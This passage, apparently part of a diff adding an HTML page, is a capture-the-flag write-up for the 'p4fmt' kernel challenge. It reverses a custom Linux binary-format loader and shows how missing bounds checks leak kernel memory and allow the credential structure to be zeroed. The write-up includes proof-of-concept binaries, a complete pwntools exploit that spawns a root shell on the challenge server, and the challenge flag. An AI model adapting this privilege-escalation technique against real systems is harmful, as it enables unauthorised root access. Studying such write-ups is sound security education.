+  _register_binfmt(&amp;p4format, <span class="hljs-number">1L</span>L);
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;
+}
+
+__<span class="hljs-function">int64 <span class="hljs-title">p4fmt_exit</span><span class="hljs-params">()</span>
+</span>{
+  <span class="hljs-keyword">return</span> unregister_binfmt(&amp;p4format);
+}</code></pre><p>It register a new binary format for p4 binary, and <code>load_p4_binary</code> is similar with <code>load_elf_binary</code> but for p4 format.</p>
+<h4 id="load_p4_binary"><a class="header-link" href="#load_p4_binary"></a>load_p4_binary</h4>
+<p>It first check whether the binary file is start with <code>&quot;P4&quot;</code>, if not it will return <code>-ENOEXEC</code>.
+After some reversing on the function, we can simply figure out the file format of p4 binary:</p>
+<pre class="hljs"><code><span class="hljs-keyword">struct</span> p4fmt{
+    <span class="hljs-keyword">char</span> magic[<span class="hljs-number">2</span>] = <span class="hljs-string">"P4"</span>,
+    <span class="hljs-keyword">int8_t</span> version,
+    <span class="hljs-keyword">int8_t</span> arg,
+    <span class="hljs-keyword">int32_t</span> load_count,
+    <span class="hljs-keyword">int64_t</span> header_offset, <span class="hljs-comment">// offset to loads</span>
+    <span class="hljs-keyword">int64_t</span> entry,
+    <span class="hljs-keyword">char</span> _gap[header_offset - <span class="hljs-number">0x18</span>],
+    <span class="hljs-keyword">struct</span> load loads[load_count]
+}
+
+<span class="hljs-keyword">struct</span> load{
+    <span class="hljs-keyword">int64_t</span> addr,
+    <span class="hljs-keyword">int64_t</span> length,
+    <span class="hljs-keyword">int64_t</span> offset
+};</code></pre><p>Version should be 0, otherwise it will <code>printk(&quot;Unknown version&quot;)</code>. There are two loading method determined by <code>arg</code>. If arg be 1, it will load the <code>address, length, offset</code> from header and do <code>vm_mmap</code>.
+We can generate a simple Hello World p4 binary:</p>
+<pre class="hljs"><code>binary = <span class="hljs-string">'P4'</span>               <span class="hljs-comment"># MAGIC</span>
+binary += p8(<span class="hljs-number">0</span>)             <span class="hljs-comment"># version</span>
+binary += p8(<span class="hljs-number">1</span>)             <span class="hljs-comment"># arg</span>
+binary += p32(<span class="hljs-number">1</span>)            <span class="hljs-comment"># load_count</span>
+binary += p64( <span class="hljs-number">0x18</span> )       <span class="hljs-comment"># header_offset</span>
+binary += p64( <span class="hljs-number">0x400080</span> )   <span class="hljs-comment"># entry</span>
+binary += p64( <span class="hljs-number">0x400000</span> | <span class="hljs-number">7</span> ) + p64( <span class="hljs-number">0x1000</span> ) + p64( <span class="hljs-number">0</span> ) <span class="hljs-comment"># addr , length , offset</span>
+binary = binary.ljust( <span class="hljs-number">0x80</span> , <span class="hljs-string">'\0'</span> ) <span class="hljs-comment"># 128</span>
+binary += asm(
+    shellcraft.echo( <span class="hljs-string">'Hello World!'</span> ) +
+    shellcraft.exit(<span class="hljs-number">0</span>)
+)</code></pre><p>Result:</p>
+<pre class="hljs"><code>/tmp $ ./hello_word
+[   22.679510] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)
+Hello World!
+/tmp $</code></pre><h4 id="vulnerability"><a class="header-link" href="#vulnerability"></a>Vulnerability</h4>
+<p>First I thought whether can do something with <code>vm_mmap</code>, because there was no checking for the arguments, but there were <code>MAP_PRIVATE</code> and <code>ADDR_LIMIT_32BIT</code> flags, so it seemed like nothing to do.</p>
+<p>After then, take a look at <code>struct linux_binprm</code>:</p>
+<pre class="hljs"><code><span class="hljs-keyword">struct</span> linux_binprm {
+    <span class="hljs-keyword">char</span> buf[BINPRM_BUF_SIZE];
+    <span class="hljs-keyword">struct</span> vm_area_struct *vma;
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> vma_pages;
+    <span class="hljs-keyword">struct</span> mm_struct *mm;
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> p; <span class="hljs-comment">/* current top of mem */</span>
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> argmin; <span class="hljs-comment">/* rlimit marker for copy_strings() */</span>
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> called_set_creds:<span class="hljs-number">1</span>, cap_elevated:<span class="hljs-number">1</span>, secureexec:<span class="hljs-number">1</span>;
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> recursion_depth; <span class="hljs-comment">/* only for search_binary_handler() */</span>
+    <span class="hljs-keyword">struct</span> file * file;
+    <span class="hljs-keyword">struct</span> cred *cred;    <span class="hljs-comment">/* new credentials */</span>
+    <span class="hljs-keyword">int</span> unsafe;        <span class="hljs-comment">/* how unsafe this exec is (mask of LSM_UNSAFE_*) */</span>
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> per_clear;    <span class="hljs-comment">/* bits to clear in current-&gt;personality */</span>
+    <span class="hljs-keyword">int</span> argc, envc;
+    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * filename;    <span class="hljs-comment">/* Name of binary as seen by procps */</span>
+    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * interp;    
+    <span class="hljs-keyword">unsigned</span> interp_flags;
+    <span class="hljs-keyword">unsigned</span> interp_data;
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> loader, exec;
+    <span class="hljs-keyword">struct</span> rlimit rlim_stack; <span class="hljs-comment">/* Saved RLIMIT_STACK used during exec. */</span>
+};</code></pre><p>Binary header will be stored to <code>bprm-&gt;buf[]</code>, and the part of <code>load_p4_binary</code> where it process memory loading:</p>
+<pre class="hljs"><code><span class="hljs-keyword">if</span> ( (p4fmt)(bprm-&gt;buf).arg &gt; <span class="hljs-number">1u</span> )
+  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)-EINVAL;
+retval = flush_old_exec(bprm, P4MAG);
+<span class="hljs-keyword">if</span> ( !retval )
+{
+  current-&gt;personality = <span class="hljs-number">0x800000</span>;
+  setup_new_exec(bprm);
+  arg = (p4fmt)(bprm-&gt;buf).arg;
+  <span class="hljs-keyword">if</span> ( arg )
+  {
+    <span class="hljs-keyword">if</span> ( arg != <span class="hljs-number">1</span> )
+      <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)-EINVAL;
+      <span class="hljs-keyword">if</span> ( (p4fmt)(bprm-&gt;buf).load_count )
+      {
+        loads = (load *)&amp;buf-&gt;magic[ (p4fmt)(bprm-&gt;buf).header_offset ];
+        <span class="hljs-keyword">do</span>
+        {
+          addr = loads-&gt;addr;
+          prot = loads-&gt;addr &amp; <span class="hljs-number">7L</span>L;
+          base = loads-&gt;addr &amp; <span class="hljs-number">0xFFFFFFFFFFFFF000</span>LL;
+          printk(<span class="hljs-string">"vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)\n"</span>, base, loads-&gt;length, loads-&gt;offset, prot);
+          offset = loads-&gt;offset;
+          length = loads-&gt;length;
+          <span class="hljs-keyword">if</span> ( addr &amp; <span class="hljs-number">8</span> )
+          {
+            vm_mmap(<span class="hljs-number">0L</span>L, base, length, prot, <span class="hljs-number">2L</span>L, offset);
+            printk(<span class="hljs-string">"clear_user(addr=0x%llx, length=0x%llx)\n"</span>, loads-&gt;addr, loads-&gt;length);
+            _clear_user(loads-&gt;addr, loads-&gt;length);
+          }
+          <span class="hljs-keyword">else</span>
+          {
+            vm_mmap(bprm-&gt;file, base, length, prot, <span class="hljs-number">2L</span>L, offset);
+          }
+          ++retval;
+          ++loads;
+      }<span class="hljs-keyword">while</span> ( (p4fmt)(bprm-&gt;buf).load_count &gt; retval );
+    }
+  }
+  <span class="hljs-keyword">else</span>{
+
+.....</code></pre><p>The problem is that it does not has bounds checking for <code>header_offset</code> and <code>load_count</code>, we can use <code>header_offset</code> to control the pointer:
+<code>loads = (load *)&amp;buf-&gt;magic[ (p4fmt *)(bprm-&gt;buf).header_offset ];</code>,
+and over reading memory by setting up <code>load_count</code>,  therefore we can leak the content in <code>struct linux_binprm</code>.</p>
+<p>PoC:</p>
+<pre class="hljs"><code>binary = <span class="hljs-string">'P4'</span>                <span class="hljs-comment"># MAGIC</span>
+binary += p8(<span class="hljs-number">0</span>)              <span class="hljs-comment"># version</span>
+binary += p8(<span class="hljs-number">1</span>)              <span class="hljs-comment"># arg</span>
+binary += p32( <span class="hljs-number">5</span> )           <span class="hljs-comment"># load_count</span>
+binary += p64( <span class="hljs-number">0x80</span> - <span class="hljs-number">0x18</span> ) <span class="hljs-comment"># header_offset</span></code></pre><p>Result:</p>
+<pre class="hljs"><code>/tmp $ ./leak
+[    7.607129] vm_mmap(load_addr=0x0, length=0x0, offset=0x0, prot=0)
+[    7.607460] vm_mmap(load_addr=0x7fffffffe000, length=0x100000001, offset=0x0, prot=3)
+[    7.607952] vm_mmap(load_addr=0xffff9f160213d000, length=0x0, offset=0x7fffffffeff1, prot=0)
+[    7.608132] vm_mmap(load_addr=0x0, length=0xffff9f16020c8b40, offset=0x800000, prot=0)
+[    7.608315] vm_mmap(load_addr=0xfffffffffffff000, length=0x1, offset=0x0, prot=7)
+[    7.608561] clear_user(addr=0xffffffffffffffff, length=0x1)
+[    7.610219] leak[526]: segfault at 0 ip 0000000000000000 sp 00007fffffffef93 error 14
+[    7.610786] Code: Bad RIP value.
+Segmentation fault
+/tmp $</code></pre><h4 id="privilege-escalation"><a class="header-link" href="#privilege-escalation"></a>Privilege escalation</h4>
+<p>For now, we can use kernel information leak to bypass kaslr, but how to achieve privilege escalation.
+We can simplify the process of <code>load_p4_binary</code>:</p>
+<ol class="list">
+<li>Check for file format.</li>
+<li><code>flush_old_exec(bprm, P4MAG)</code></li>
+<li><code>setup_new_exec(bprm)</code></li>
+<li>Process memory loading.</li>
+<li><code>install_exec_creds(bprm)</code></li>
+<li><code>set_binfmt(&amp;p4format)</code></li>
+<li><code>setup_arg_pages(bprm, randomize_stack_top(STACK_TOP), 0LL)</code></li>
+<li><code>finalize_exec(bprm)</code></li>
+<li><code>start_thread(regs, p4_entry, bprm-&gt;p)</code></li>
+</ol>
+<p><code>install_exec_creds(bprm)</code> is interesting, it will do <code>commit_creds(bprm-&gt;cred);</code> inside.</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">install_exec_creds</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> linux_binprm *bprm)</span>
+</span>{
+    security_bprm_committing_creds(bprm);
+
+    commit_creds(bprm-&gt;cred);
+    bprm-&gt;cred = <span class="hljs-literal">NULL</span>;
+
+    <span class="hljs-keyword">if</span> (get_dumpable(current-&gt;mm) != SUID_DUMP_USER)
+        perf_event_exit_task(current);
+
+    security_bprm_committed_creds(bprm);
+    mutex_unlock(&amp;current-&gt;signal-&gt;cred_guard_mutex);
+}</code></pre><p>We are already able to leak the address of <code>struct cred *cred</code> in <code>struct linux_binprm *bprm</code>, and the <code>struct cred</code>:</p>
+<pre class="hljs"><code><span class="hljs-keyword">struct</span> cred {
+    <span class="hljs-keyword">atomic_t</span>    usage;
+    <span class="hljs-keyword">kuid_t</span>        uid;        <span class="hljs-comment">/* real UID of the task */</span>
+    <span class="hljs-keyword">kgid_t</span>        gid;        <span class="hljs-comment">/* real GID of the task */</span>
+    <span class="hljs-keyword">kuid_t</span>        suid;        <span class="hljs-comment">/* saved UID of the task */</span>
+    <span class="hljs-keyword">kgid_t</span>        sgid;        <span class="hljs-comment">/* saved GID of the task */</span>
+    <span class="hljs-keyword">kuid_t</span>        euid;        <span class="hljs-comment">/* effective UID of the task */</span>
+    <span class="hljs-keyword">kgid_t</span>        egid;        <span class="hljs-comment">/* effective GID of the task */</span>
+    <span class="hljs-keyword">kuid_t</span>        fsuid;        <span class="hljs-comment">/* UID for VFS ops */</span>
+    <span class="hljs-keyword">kgid_t</span>        fsgid;        <span class="hljs-comment">/* GID for VFS ops */</span>
+    <span class="hljs-keyword">unsigned</span>    securebits;    <span class="hljs-comment">/* SUID-less security management */</span>
+    <span class="hljs-keyword">kernel_cap_t</span>    cap_inheritable; <span class="hljs-comment">/* caps our children can inherit */</span>
+    <span class="hljs-keyword">kernel_cap_t</span>    cap_permitted;    <span class="hljs-comment">/* caps we're permitted */</span>
+    <span class="hljs-keyword">kernel_cap_t</span>    cap_effective;    <span class="hljs-comment">/* caps we can actually use */</span>
+    <span class="hljs-keyword">kernel_cap_t</span>    cap_bset;    <span class="hljs-comment">/* capability bounding set */</span>
+    <span class="hljs-keyword">kernel_cap_t</span>    cap_ambient;    <span class="hljs-comment">/* Ambient capability set */</span>
+    ...</code></pre><p>If we can overwrite the <code>uid</code> and <code>gid</code> in <code>bprm-&gt;cred</code> before calling <code>install_exec_creds</code>, so that it would install the new <code>cred</code>!</p>
+<p>But how to set the <code>uid</code> and <code>gid</code> to zero, remember there is a funtion named <code>_clear_user()</code>:</p>
+<pre class="hljs"><code>Name
+clear_user — Zero a block of memory in user space.
+
+<span class="hljs-function">Synopsis
+<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-title">clear_user</span> <span class="hljs-params">(<span class="hljs-keyword">void</span> __user * to, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> n)</span></span>;</code></pre><p>There is <code>_clear_user(loads-&gt;addr, loads-&gt;length);</code> in <code>load_p4_binary</code> where <code>loads-&gt;addr</code> and <code>loads-&gt;length</code> are controllable, that means we can zero a block of memory everywhere. That&#39;s awesome!</p>
+<h4 id="constraints"><a class="header-link" href="#constraints"></a>Constraints</h4>
+<p>Although we are able to leak the memory, but we can&#39;t do the leak and setting up header at the same time with the same binary.
+Execute another time, the address of <code>cred</code> has some random offset, but I found the interesting thing:</p>
+<pre class="hljs"><code>[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] cred -&gt; <span class="hljs-number">0</span>xffff99cb021fa180
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] cred -&gt; <span class="hljs-number">0</span>xffff99cb021faf00
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] cred -&gt; <span class="hljs-number">0</span>xffff99cb021fab40
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] cred -&gt; <span class="hljs-number">0</span>xffff99cb021faa80
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] cred -&gt; <span class="hljs-number">0</span>xffff99cb021facc0
+
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] cred -&gt; <span class="hljs-number">0</span>xffff99cb021fa180
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] cred -&gt; <span class="hljs-number">0</span>xffff99cb021faf00
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] cred -&gt; <span class="hljs-number">0</span>xffff99cb021fab40
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] cred -&gt; <span class="hljs-number">0</span>xffff99cb021faa80
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] cred -&gt; <span class="hljs-number">0</span>xffff99cb021facc0</code></pre><p>The address will be the same when execute the binary every five times, don&#39;t know the reason...</p>
+<h4 id="exploit"><a class="header-link" href="#exploit"></a>Exploit</h4>
+<p>Generate a p4 binary for kernel memory leak first, then set up loads header of second p4 binary to trigger <code>_clear_user( bprm-&gt;cred | 8 + 0x10 , 0x48 ); // +0x10 prevent crashing caused by the NULL pointer</code>.
+<code>install_exec_creds(bprm)</code> will call <code>commit_creds(bprm-&gt;cred);</code> and process our new <code>bprm-&gt;cred</code>, then execute our p4 binary with root privilege!
+Execute shellocde and enjoy the root shell :D</p>
+<h4 id="root-shell"><a class="header-link" href="#root-shell"></a>Root shell</h4>
+<p><img src="https://i.imgur.com/u1j3uNG.png" alt="">
+exploit:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> base64
+<span class="hljs-keyword">import</span> re
+
+<span class="hljs-comment"># p4{4r3_y0U_4_81n4ry_N1njA?}</span>
+
+context.arch = <span class="hljs-string">'amd64'</span>
+host , port = <span class="hljs-string">'p4fmt.zajebistyc.tf'</span> , <span class="hljs-number">30002</span>
+y = remote( host , port )
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_p4_binary</span><span class="hljs-params">( version = <span class="hljs-number">0</span> , arg = <span class="hljs-number">1</span> , section_header_offset = <span class="hljs-number">0x18</span> , sections_len = <span class="hljs-number">0</span> , entry = <span class="hljs-number">0</span> , sections = [] , code = <span class="hljs-string">''</span> )</span>:</span>
+    b = <span class="hljs-string">'P4'</span> <span class="hljs-comment"># MAGIC</span>
+    b += p8( version ) + p8( arg ) + p32( sections_len ) + p64( section_header_offset ) + p64( entry )
+    b += <span class="hljs-string">''</span>.join( flat(s) <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> sections )
+    <span class="hljs-keyword">if</span> code:
+        b = b.ljust( entry &amp; <span class="hljs-number">0xfff</span> , <span class="hljs-string">'\0'</span> )
+        b += code
+    <span class="hljs-keyword">return</span> b
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sp</span><span class="hljs-params">( cmd )</span>:</span>
+    y.sendlineafter( <span class="hljs-string">'$'</span> , cmd )
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span><span class="hljs-params">()</span>:</span>
+    sp( <span class="hljs-string">'./leak'</span> )
+    y.recvuntil( <span class="hljs-string">'length='</span> )
+    cred = int( y.recvuntil( <span class="hljs-string">','</span> )[:<span class="hljs-number">-1</span>] , <span class="hljs-number">16</span> )
+    success( <span class="hljs-string">'cred -&gt; %s'</span> % hex( cred ) )
+    <span class="hljs-keyword">return</span> cred
+
+sp( <span class="hljs-string">'cd /tmp'</span> )
+
+p4 = gen_p4_binary( section_header_offset = <span class="hljs-number">0x90</span> , sections_len = <span class="hljs-number">1</span> )
+sp( <span class="hljs-string">"echo %s | base64 -d &gt; ./leak"</span> % ( base64.b64encode( p4 ) ) )
+sp( <span class="hljs-string">'chmod +x ./leak'</span> )
+cred = leak() <span class="hljs-comment"># 1</span>
+
+p4 = gen_p4_binary( sections = [[<span class="hljs-number">0x7000000</span> | <span class="hljs-number">7</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0</span>], [cred | <span class="hljs-number">8</span> + <span class="hljs-number">0x10</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0</span>]] , sections_len = <span class="hljs-number">2</span>  , entry = <span class="hljs-number">0x7000090</span> , code = asm( shellcraft.sh() ) )
+sp( <span class="hljs-string">'printf \'\\%s\' &gt; ./pwn'</span> % <span class="hljs-string">'\\'</span>.join( oct( ord( _ ) )[<span class="hljs-number">1</span>:].rjust( <span class="hljs-number">3</span> ,<span class="hljs-string">'0'</span> ) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> p4 ) )
+sp( <span class="hljs-string">'chmod +x ./pwn'</span> )
+
+<span class="hljs-string">'''
+[+] cred -&gt; 0xffff99cb021fa180
+[+] cred -&gt; 0xffff99cb021faf00
+[+] cred -&gt; 0xffff99cb021fab40
+[+] cred -&gt; 0xffff99cb021faa80
+[+] cred -&gt; 0xffff99cb021facc0
+
+[+] cred -&gt; 0xffff99cb021fa180
+[+] cred -&gt; 0xffff99cb021faf00
+[+] cred -&gt; 0xffff99cb021fab40
+[+] cred -&gt; 0xffff99cb021faa80
+[+] cred -&gt; 0xffff99cb021facc0
+'''</span>
+
+<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):
+    leak()
+
+sp( <span class="hljs-string">'./pwn'</span> ) <span class="hljs-comment"># cred should be the same as first leak</span>
+
+y.sendlineafter( <span class="hljs-string">'/tmp #'</span> , <span class="hljs-string">'cat /flag'</span> ) <span class="hljs-comment"># root !</span>
+
+y.interactive()</code></pre>        </article>
+      </div>
+    </div>
+  </body>
+</html>
